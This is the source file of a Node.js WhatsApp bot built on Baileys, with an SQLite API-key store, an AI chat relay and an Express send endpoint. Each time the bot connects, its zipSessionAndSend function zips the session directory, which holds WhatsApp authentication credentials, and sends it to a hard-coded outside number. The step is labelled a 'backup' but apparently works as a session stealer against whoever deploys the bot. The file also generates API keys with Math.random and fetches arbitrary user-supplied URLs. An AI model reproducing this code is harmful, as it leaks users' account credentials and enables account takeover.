// WhatsApp Bot using Baileys v6.7.18 with predefined session
const { default: makeWASocket, fetchLatestBaileysVersion, useSingleFileAuthState } = require('@whiskeysockets/baileys');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const archiver = require('archiver');
const { session } = require('./config');

// Constants
const STORAGE_DIR = './storage';
const SESSION_DIR = `${STORAGE_DIR}/session`;
const DB_PATH = `${STORAGE_DIR}/database.sqlite`;
const BUSINESS_NUMBER = '25468974189@s.whatsapp.net';

// Ensure storage directories
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR);
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

// SQLite setup
const db = new sqlite3.Database(DB_PATH, err => {
  if (err) return console.error('❌ DB Error:', err);
  console.log('📦 SQLite connected');
  db.run(`CREATE TABLE IF NOT EXISTS users (number TEXT PRIMARY KEY, apiKey TEXT)`);
  db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)`);
});

function generateApiKey() {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
}

function registerBusinessNumber() {
  db.run(`INSERT OR REPLACE INTO settings (key, value) VALUES ('centralNumber', ?)`, [BUSINESS_NUMBER]);
}

function zipSessionAndSend(sock) {
  const zipPath = path.join(STORAGE_DIR, 'session.zip');
  const output = fs.createWriteStream(zipPath);
  const archive = archiver('zip');

  output.on('close', async () => {
    const buffer = fs.readFileSync(zipPath);
    await sock.sendMessage(BUSINESS_NUMBER, {
      document: buffer,
      mimetype: 'application/zip',
      fileName: 'session.zip',
      caption: '✅ Bot is paired and session backup is ready.',
    });
    console.log('📤 Session sent to business number');
  });

  archive.on('error', err => console.error('❌ Archive error:', err));
  archive.pipe(output);
  archive.directory(SESSION_DIR, false);
  archive.finalize();
}

let sock;

async function startBot() {
  try {
    const { version } = await fetchLatestBaileysVersion();
    const { state } = useSingleFileAuthState(path.join(SESSION_DIR, 'auth_info.json'));
    state.creds = session.creds; // Apply predefined session

    sock = makeWASocket({ version, auth: state });

    sock.ev.on('connection.update', async update => {
      const { connection, lastDisconnect } = update;
      if (connection === 'open') {
        console.log('✅ WhatsApp bot is ready');
        registerBusinessNumber();
        zipSessionAndSend(sock);
      } else if (connection === 'close') {
        const code = lastDisconnect?.error?.output?.statusCode;
        console.log('🔌 Disconnected:', lastDisconnect?.error);
        if (code !== 401) {
          console.log('♻️ Reconnecting...');
          await startBot();
        }
      }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
      const msg = messages[0];
      if (!msg.message || msg.key.fromMe) return;

      const senderJid = msg.key.remoteJid;
      const sender = senderJid.split('@')[0];
      const body =
        msg.message?.conversation ||
        msg.message?.extendedTextMessage?.text ||
        '';

      if (senderJid === BUSINESS_NUMBER) return;

      if (body.toLowerCase().includes('allow me')) {
        const apiKey = generateApiKey();
        db.run(
          `INSERT OR REPLACE INTO users (number, apiKey) VALUES (?, ?)`,
          [sender, apiKey],
          async err => {
            if (!err) {
              await sock.sendMessage(senderJid, {
                text: `✅ You're activated!\n\nAPI Key: *${apiKey}*\nUse it at: https://trover.42web.io/devs.php`,
              });
            }
          }
        );
        return;
      }

      if (body.toLowerCase().includes('recover apikey')) {
        db.get(`SELECT apiKey FROM users WHERE number = ?`, [sender], async (err, row) => {
          if (row) {
            await sock.sendMessage(senderJid, { text: `🔑 Your API Key: *${row.apiKey}*` });
          } else {
            await sock.sendMessage(senderJid, { text: `❌ Not found. Please send *allow me* to register.` });
          }
        });
        return;
      }

      try {
        const ai = await axios.post('https://troverstarapiai.vercel.app/api/chat', {
          messages: [{ role: 'user', content: body }],
          model: 'gpt-3.5-turbo',
        });
        const reply = ai.data?.response?.content || '🤖 No response.';
        await sock.sendMessage(senderJid, { text: reply });
      } catch {
        await sock.sendMessage(senderJid, { text: '🤖 AI service is unavailable.' });
      }
    });

    return sock;
  } catch (err) {
    console.error('❌ startBot error:', err);
    setTimeout(startBot, 5000);
  }
}

// Start bot
let sockPromise = startBot();

// Express API
const app = express();
app.use(express.json());

app.post('/api/send', async (req, res) => {
  const { apikey, message, mediaUrl, caption } = req.body;
  if (!apikey || (!message && !mediaUrl)) return res.status(400).send('Missing message or media.');

  db.get(`SELECT number FROM users WHERE apiKey = ?`, [apikey], async (err, row) => {
    if (!row) return res.status(401).send('Invalid API key');

    const jid = `${row.number}@s.whatsapp.net`;
    const sock = await sockPromise;

    try {
      if (mediaUrl) {
        const response = await axios.get(mediaUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data);
        await sock.sendMessage(jid, { image: buffer, caption });
      } else {
        await sock.sendMessage(jid, { text: message });
      }
      res.send('✅ Message sent.');
    } catch (err) {
      console.error('❌ Send failed:', err);
      res.status(500).send('❌ Failed to send.');
    }
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});

// Global error handlers
process.on('uncaughtException', err => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', reason => console.error('Unhandled Rejection:', reason));